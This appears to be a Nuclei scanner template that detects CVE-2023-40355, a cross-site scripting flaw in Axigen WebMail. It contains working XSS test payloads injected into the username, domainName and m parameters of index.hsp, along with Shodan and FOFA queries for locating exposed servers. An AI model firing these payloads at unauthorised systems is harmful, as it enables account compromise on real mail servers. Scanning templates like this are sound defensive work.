id: CVE-2023-40355

info:
  name: Axigen WebMail - Cross-Site Scripting
  author: amir-h-fallahi
  severity: medium
  description: |
    Cross Site Scripting (XSS) vulnerability in Axigen versions 10.3.3.0 before 10.3.3.59, 10.4.0 before 10.4.19, and 10.5.0 before 10.5.5, allows authenticated attackers to execute arbitrary code and obtain sensitive information via the logic for switching between the Standard and Ajax versions.
  reference:
    - https://www.axigen.com/knowledgebase/Axigen-WebMail-XSS-Vulnerability-CVE-2023-40355-_396.html
    - https://nvd.nist.gov/vuln/detail/CVE-2023-40355
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cve-id: CVE-2023-40355
    cwe-id: CWE-79
    epss-score: 0.26672
    epss-percentile: 0.96151
    cpe: cpe:2.3:a:axigen:axigen_mobile_webmail:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: axigen
    product: axigen_mobile_webmail
    shodan-query: http.favicon.hash:-1247684400
    fofa-query: icon_hash=-1247684400
  tags: cve,cve2023,xss,axigen,webmail

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.hsp?passwordExpired=yes&username=\\'-alert(document.domain),//"
      - "{{BaseURL}}/index.hsp?passwordExpired=yes&domainName=\\'-alert(document.domain),//"
      - "{{BaseURL}}/index.hsp?m=',alert(document.domain),'"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "\\\\'-alert(document.domain),//"
          - "',alert(document.domain),'"
        condition: or

      - type: dsl
        dsl:
          - 'contains(header, "text/html")'
          - 'contains(response, "Axigen")'
          - 'status_code == 200'
        condition: and
# digest: 4b0a00483046022100c3c5b4708e30f14b6f32c525cbb0e68edd54db3704794122f058332e33b1ea5c022100cf4fa6cfcb32abdcc5a72d17d8e6ec545c51bf215eaf6023d740a72adc3e5504:922c64590222798bb761d5b6d8e72950